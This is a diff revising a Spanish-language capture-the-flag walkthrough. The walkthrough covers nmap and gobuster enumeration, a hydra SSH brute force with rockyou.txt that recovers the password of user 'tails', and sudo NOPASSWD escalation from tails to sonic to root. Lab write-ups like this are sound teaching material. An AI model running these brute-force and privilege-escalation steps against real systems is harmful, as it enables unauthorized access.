@@ -4,46 +4,46 @@
 Realizamos un escaneo con `nmap` para detectar puertos abiertos y sus versiones. 
 
 ```bash
-nmap <IP_DEL_OBJETIVO>
+nmap -sC -sV <IP_DEL_OBJETIVO>
 ```
 
 **Resultados Clave:**
 
 *   `22/tcp open ssh OpenSSH 9.6p1 Ubuntu`
 *   `80/tcp open http Apache httpd 2.4.58 ((Ubuntu))
-## 2. Enumeración Web y Búsqueda de Credenciales
 
-Al acceder a la dirección IP del objetivo en un navegador web, la página muestra una pista importante.
+## 2. Enumeración Web
 
-### 2.1. Pista en la Página Web
+Al acceder al servicio web en el puerto 80 (`http://<IP_DEL_OBJETIVO>`), nos encontramos con una página que menciona explícitamente la palabra "tails". En el contexto de un CTF, esto suele indicar un posible nombre de usuario.
 
-La página web en `http://<IP_DEL_OBJETIVO>` muestra la palabra "tails". Esto sugiere que "tails" podría ser un nombre de usuario en el sistema, probablemente para el servicio SSH.
+### 2.1. Fuzzing de Directorios
 
-### 2.2. Enumeración de Directorios
-
-Realizamos una enumeración de directorios con `gobuster` para buscar más pistas en el servidor web, pero no encontramos nada relevante para el acceso inicial.
+Para descartar otros vectores de entrada, realizamos una enumeración de directorios utilizando `gobuster`.
 
 ```bash
-gobuster dir -u http://<IP_DEL_OBJETIVO> -w /path/to/wordlist/directory-list-lowercase-2.3-medium.txt
+gobuster dir -u http://<IP_DEL_OBJETIVO> -w /usr/share/wordlists/dirb/common.txt
 ```
 
-La fuerza bruta es la siguiente opción lógica para obtener la contraseña del usuario `tails`.
+Al no encontrar directorios ocultos relevantes, confirmamos que el vector principal es el ataque de fuerza bruta contra el usuario identificado.
 
-## 3. Acceso Inicial (Fuerza Bruta SSH)
+## 3. Acceso Inicial (SSH)
 
-Utilizamos `hydra` para intentar adivinar la contraseña del usuario `tails` en el servicio SSH, usando un diccionario de contraseñas común como `rockyou.txt`.
+Procedemos a atacar el servicio SSH utilizando el usuario `tails` y un diccionario de contraseñas.
+
+### 3.1. Fuerza Bruta con Hydra
 
 ```bash
-hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://<IP_DEL_OBJETIVO>
+hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://<IP_DEL_OBJETIVO> -t 4
 ```
 
-**Resultado Clave:**
+**Resultado Exitoso:**
 
-*   La contraseña obtenida es `3117548331`.
+- **Login:** `tails`
+- **Password:** `3117548331`
 
-### 3.1. Conexión SSH
+### 3.2. Conexión SSH
 
-Con las credenciales obtenidas (`tails:3117548331`), nos conectamos al servidor SSH.
+Establecemos la conexión con las credenciales obtenidas:
 
 ```bash
 ssh tails@<IP_DEL_OBJETIVO>
@@ -54,41 +54,53 @@ ssh tails@<IP_DEL_OBJETIVO>
 
 Una vez que hemos obtenido acceso SSH como el usuario `tails`, el objetivo es escalar privilegios a `root`.
 
-### 4.1. Verificación de Permisos Sudo
+### 4.1. Escalada Horizontal (Tails -> Sonic)
 
-Verificamos qué comandos puede ejecutar el usuario `tails` con `sudo` sin necesidad de contraseña. Esto se hace con el comando `sudo -l`.
+Enumeramos los permisos de sudo del usuario actual:
 
-```bash
+```Bash
 sudo -l
 ```
 
-**Resultados Clave:**
+**Salida:**
 
-*   `User tails may run the following commands on ...: (sonic) NOPASSWD: ALL`
+```
+User tails may run the following commands on ...:
+    (sonic) NOPASSWD: ALL
+```
 
-Esto significa que el usuario `tails` puede ejecutar cualquier comando como el usuario `sonic` sin necesidad de contraseña.
+El usuario `tails` tiene permiso para ejecutar _cualquier comando_ como el usuario `sonic` sin contraseña. Escalamos al usuario `sonic`:
 
-### 4.2. Escalada de Privilegios Horizontal
-
-Podemos obtener un shell como `sonic`.
-
-```bash
+```Bash
 sudo -u sonic /bin/bash
-# Ahora estamos como el usuario sonic
+```
 
+### 4.2. Escalada Vertical (Sonic -> Root)
+
+Una vez logueados como `sonic`, repetimos la enumeración de privilegios:
+
+```Bash
+whoami
+# sonic
 sudo -l
 ```
 
-```bash
-User sonic may run the following commands on fd41cefc8882:
+**Salida:**
+```
+User sonic may run the following commands on ...:
     (ALL) NOPASSWD: ALL
-
-sudo su
 ```
 
-El comando `whoami` confirmará que hemos escalado exitosamente a `root`.
+El usuario `sonic` tiene permisos completos de `sudo` sobre el sistema. Ejecutamos una shell como superusuario:
 
-```bash
+```Bash
+sudo su
+# o sudo /bin/bash
+```
+
+Confirmamos el compromiso total del sistema:
+
+```Bash
 whoami
 # root
 ```
